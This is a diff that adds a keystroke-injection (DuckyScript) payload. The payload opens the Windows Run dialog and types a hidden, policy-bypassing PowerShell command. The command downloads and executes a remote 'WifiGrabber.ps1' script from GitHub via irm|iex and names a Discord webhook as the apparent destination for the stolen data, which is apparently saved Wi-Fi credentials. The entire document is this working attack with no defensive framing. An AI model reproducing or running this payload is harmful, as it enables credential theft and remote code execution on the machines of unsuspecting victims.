@@ -1,0 +1,10 @@
+
+DELAY 750
+WINDOWS d
+DELAY 950
+WINDOWS r
+DELAY 650
+STRING powershell.exe powershell -w h -NoP -Ep Bypass $db='';$dc='https://discord.com/api/webhooks/1143896132548837396/KAnRerfgL_RAXItyby6bIuUjgYqBsVzeI1zYXvdeh8GP5tq_9bXo3PEzzuwZWYaRLrN0';irm https://raw.githubusercontent.com/lcandini/wifi-capture/main/WifiGrabber.ps1 | iex; Start-Sleep -Seconds 1; exit
+DELAY 100
+ENTER
+
